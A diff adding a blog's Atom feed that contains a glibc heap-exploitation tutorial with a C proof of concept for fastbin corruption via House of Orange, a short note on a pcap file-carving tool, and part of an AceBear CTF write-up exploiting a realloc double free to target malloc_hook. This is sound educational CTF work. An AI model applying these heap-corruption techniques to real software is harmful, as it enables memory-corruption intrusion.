@@ -1,0 +1,327 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-10T03:22:08+05:30</updated><id>http://localhost:4000/</id><title type="html">sherl0ck’s home</title><subtitle></subtitle><entry><title type="html">Fastbin dup with House of Orange</title><link href="http://localhost:4000/fastbin-dup/" rel="alternate" type="text/html" title="Fastbin dup with House of Orange" /><published>2018-02-14T00:00:00+05:30</published><updated>2018-02-14T00:00:00+05:30</updated><id>http://localhost:4000/fastbin-dup</id><content type="html" xml:base="http://localhost:4000/fastbin-dup/">&lt;p&gt;This post will demonstrate an alternate way to exploit the House of Orange scenario which was originally shown by 4ngelboy. It involves using fastbin corruption on the old top chunk to allocate a chunk at an arbitrary location, thus achieving a write-what-where primitive.  The premises are same as that of House of Orange –&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;A heap overflow must be present.&lt;/li&gt;
+  &lt;li&gt;We must control the size that is being passed to malloc.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The advantages of this alternative are –&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Given that the address of the target location is known, no other heap or libc leaks are required.&lt;/li&gt;
+  &lt;li&gt;It does not use the _IO_FILE jump table. So the patch with the latest libc, on the vtable check does not apply here.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The proof of concept that this post will be following can be found &lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://www.github.com/vigneshsrao/Concepts/blob/master/fastbin_orange/fastbin_orange.c&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target @ %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;top chunk @ %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x71&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;new chunk @ %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We start with the assumption that the target location is known. This can be a GOT address, malloc_hook, free_hook, a stack location etc. We will take the target location as a stack variable. Also, for this particular PoC, we will be allocating a chunk of size 0x50, but in general, a chunk of any size in the fastbin range can be allocated. Since we will finally be performing a fastbin dup, we need that the size of the chunk is written near our target location.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The first part is similar to the House of Orange. We first allocate a large chunk, edit the size of the top chunk and then allocate another large chunk whose size should be greater than that of the current top chunk. Note that the top chunk must always satisfy the following conditions –&lt;/p&gt;
+
+&lt;p&gt;Top chunk’s PREV_IN_USE bit must be set
+Top chunk + size should be page aligned
+The normal page size on Linux is 4kB (0x1000 bytes). Also, whenever a chunk is allocated, it has 16 bytes of metadata. So we must malloc (0x1000 – 16 – 0x70) bytes. We will come to why it’s “- 0x70” and not “- 0x50” shortly.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now we have to edit the size of the top chunk. Here, we assume that there is a heap overflow which can be used to do this. We will overwrite the size field of the top chunk with 0x71. Thus the PREV_IN_USE bit is set, and top chunk + size(0x70) is page aligned.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x71&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now we will come to why we were using the size 0x70, instead of 0x50. When the next call to malloc is made with a size greater than the size of the top chunk, the current top will be extended and the. A temporary chunk is used to keep track of the change in the size of the top chunk. For the temporary chunk, 0x20 byte’s are allocated from the top chunk. Thus after the allocation of the temporary chunk, the size of top chunk becomes 0x70-0x20=0x50 and the top chunk is freed. Thus the fastbin of size 0x50 contains the old top chunk.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now, this scenario can be exploited using a simple fastbin dup as we have a heap overflow. For this, we will first set the next pointer of the fastbin list of size 0x50 to point to the target address. Note that the target address should be such that, 0x51 must be written at the address + 8.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now, a malloc of size 0x50-16 will return the old top chunk and set the head of the fastbin of size 0x50 to our target chunk.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The next malloc request of size 0x50-16 will return us a chunk at our target location.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;@&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p class=&quot;image-pull-left&quot;&gt;&lt;img src=&quot;/assets/img/fastbin/fastbin_orange.png&quot; alt=&quot;fastbin&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;credits&quot;&gt;Credits:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html&quot;&gt;Angelboy’s blog post&lt;/a&gt; on House of Orange.&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c&quot;&gt;House of Orange PoC&lt;/a&gt; in Shellphish’s &lt;a href=&quot;https://github.com/shellphish/how2heap&quot;&gt;how2heap&lt;/a&gt; repository.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="heap" /><category term="fastbin" /><category term="method" /><summary type="html">Alternate way to exploit the House of Orange scenario using fastbin corruption</summary></entry><entry><title type="html">FindFile</title><link href="http://localhost:4000/findfile/" rel="alternate" type="text/html" title="FindFile" /><published>2018-02-14T00:00:00+05:30</published><updated>2018-02-14T00:00:00+05:30</updated><id>http://localhost:4000/findfile</id><content type="html" xml:base="http://localhost:4000/findfile/">&lt;p class=&quot;notice&quot;&gt;Install: Just download the script from the following link&lt;br /&gt;
+Usage: python findfile.py &amp;lt;path/to/pcap&amp;gt;&lt;br /&gt;
+Link: &lt;a href=&quot;https://github.com/vigneshsrao/CTF-Forensics-scripts/blob/master/findfile.py&quot; target=&quot;blank&quot;&gt;github.com/vigneshsrao/CTF-Forensics-scripts&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This script can detect files embedded in network capture files and also dump those files out. Wireshark has this file detection and dumping facility inbuilt, but it works only with a limited set of protocols. For example, it does not work if the protocol of the capture file is USB protocol.&lt;/p&gt;
+
+&lt;p&gt;This is pretty useful in CTF events, when the number of packets are large and we are required to find a particular file within the capture. Since the detection check is pretty weak, many false alarms are triggred, and corrupted files are dumped.&lt;/p&gt;</content><author><name></name></author><category term="Wireshark" /><category term="Forensics" /><category term="Tool" /><summary type="html">Python script to detect and dump files from network dumps</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/projects/findfile/logo.png" /></entry><entry><title type="html">AceBear CTF: memo_heap Writeup</title><link href="http://localhost:4000/memoheap/" rel="alternate" type="text/html" title="AceBear CTF: memo_heap Writeup" /><published>2018-02-01T00:00:00+05:30</published><updated>2018-02-01T00:00:00+05:30</updated><id>http://localhost:4000/memoheap</id><content type="html" xml:base="http://localhost:4000/memoheap/">&lt;p&gt;I didn’t get a chance to try this challenge out during the CTF, but it was a pretty interesting and fun challenge. The method I am going to describe may not be the most efficient but this is what came to my mind first.&lt;/p&gt;
+
+&lt;p&gt;So let’s get started up with the write-up. First for the mitigations –&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;nx&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;peda$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;checksec&lt;/span&gt;
+
+    &lt;span class=&quot;nl&quot;&gt;CANARY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ENABLED&lt;/span&gt;
+    &lt;span class=&quot;nl&quot;&gt;FORTIFY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;disabled&lt;/span&gt;
+    &lt;span class=&quot;nl&quot;&gt;NX&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ENABLED&lt;/span&gt;
+    &lt;span class=&quot;nl&quot;&gt;PIE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ENABLED&lt;/span&gt;
+    &lt;span class=&quot;nl&quot;&gt;RELRO&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FULL&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Okay. So pretty much all mitigations are enabled. Now let’s step into the functioning of the binary.&lt;/p&gt;
+
+&lt;p&gt;The create memo option basically allocates memory and takes in the input for the following structure-&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memodata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memosize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The memodata is a pointer to the data taken as input. The memory for this data is also allocated on the heap. &lt;code class=&quot;highlighter-rouge&quot;&gt;memosize&lt;/code&gt; contains the length of &lt;code class=&quot;highlighter-rouge&quot;&gt;memodata&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; is set on creation of an instance of the structure and is unset whenever the entry is edited. We can view or edit an entry only if it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; is set. Thus an entry can be edited only once and can’t be viewed after that. The user has to provide the size of the data. After the creation of an instance of &lt;code class=&quot;highlighter-rouge&quot;&gt;memo&lt;/code&gt;, the pointer to that instance is saved in a table in the bss segment.&lt;/p&gt;
+
+&lt;p&gt;The edit functionality reads the index to edit and first checks if the flag of the entry to edit is set or not. If not it returns. If the flag is set, then it unset’s it and asks the user for the new data. Here’s an interesting point. It realloc’s the memodata pointer with size same as that of memosize.&lt;/p&gt;
+
+&lt;p&gt;The option to show memo reads in the index and checks if the flag is set. If so it displays the memodata, memosize and the flag attributes of the memo structure.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;delete&lt;/code&gt; functionality takes in the index and first free’s memodata. It then free’s that particular instance of memo. There is no use-after-free here.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;u&gt;Vulnerability&lt;/u&gt;&lt;/h2&gt;
+&lt;p&gt;If we give the size of the memo as zero and then edit it, the edit function basically does –&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;realloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pointer_to_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Now from the man page of realloc –&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if size is equal to zero, and ptr is not NULL, then the call is equivalent to `free(ptr)`.  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;So the &lt;code class=&quot;highlighter-rouge&quot;&gt;memodata&lt;/code&gt; pointer has now been freed. After this, if we delete this same entry, then &lt;code class=&quot;highlighter-rouge&quot;&gt;memodata&lt;/code&gt; is freed again we get a double free with which we can corrupt some fastbins.&lt;/p&gt;
+
+&lt;h2 id=&quot;memory-leaks&quot;&gt;&lt;u&gt;Memory Leaks&lt;/u&gt;&lt;/h2&gt;
+
+&lt;p&gt;For the libc leak, we first create a memo (say memo ‘A’) with large size (out of the fastbin range).  We then create another memo (say ‘B’) of any size. Now delete memo ‘A’. The data chunk will now be a part of the unsorted bin list and thus will have the starting address of the unsorted bin in the first 8 bytes of the data chunk. Now, just create a memo of size 0 (to conserve the address in the first 8 bytes). The chunk that will be allocated will have a size of 0x20 bytes and will be the top part of the unsorted bin chunk that we freed previously. So the first 8 bytes now have a libc address. Just show the memo and we have a libc leak.&lt;/p&gt;
+
+&lt;p&gt;For the heap leak, we first delete memo ‘B’. This initializes the fastbin list. We now delete the memo we used to get the libc leak. The data chunk of this memo is now in the fastbin list with first 8 bytes pointing to the previous chunk (so the first 8 bytes contain a heap address). Now again allocate a memo of size 0 (size is zero for the same reason as above). The first 8 bytes of the data chunk contains a heap address. Show the memo to get a heap leak.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-exploit&quot;&gt;&lt;u&gt;The exploit&lt;/u&gt;&lt;/h2&gt;
+
+&lt;p&gt;Since RELRO is full, we can’t overwrite a GOT entry. So I focused on overwriting other targets in the memory – like malloc_hook, free_hook and realloc_hook. My plan was to somehow abuse the fastbin list to allocate a chunk above malloc_hook. I could thus overwrite the malloc_hook with any address. But in order to get a fastbin chunk allocated at a random location, it is necessary that there must be a size somewhere near the target location. Here is view of the memory just before malloc_hook –&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/memoheap/malloc_hook.png&quot; alt=&quot;malloc_hook&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And before free_hook –&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/memoheap/free_hook.png&quot; alt=&quot;free_hook&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All byte’s above and near free hook are null. So we can’t allocate a fastbin chunk to  free_hook as there is nothing that we can use as size near free_hook. Now, let’s take a look at the area above malloc_hook from this view –&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/memoheap/fastbin.png&quot; alt=&quot;fastbin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We see that we can use the value at the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7dd1af5&lt;/code&gt; ( = 0x7f ) as the size field for our chunk. If we succeed in getting a chunk here, then we can overwrite both – malloc_hook and realloc_hook. Note that the size of the fastbin chunk that we want to allocate here must be of size 0x70 bytes (the last 3 bit’s of the size field are flag’s).&lt;/p&gt;
+
+&lt;p&gt;So now our challenge is to get a chunk allocated above malloc_hook. We can’t directly misuse the double-free vulnerability, as the chunk that is doubly freed has a size of 0x20 and we need to corrupt the next pointer of a free fastbin chunk of size 0x70.&lt;/p&gt;
+
+&lt;p&gt;Now imagine that we have a free fastbin chunk of size 0x70. Also, assume that the chunk before this fastbin chunk is also a &lt;code class=&quot;highlighter-rouge&quot;&gt;memodata&lt;/code&gt; chunk. So we control the data that goes into the chunk. Now if we forge a 0x21 just before the end of the chunk, then we can use the double free vulnerability to allocate a chunk here. This image may make things clearer –&lt;/p&gt;
+
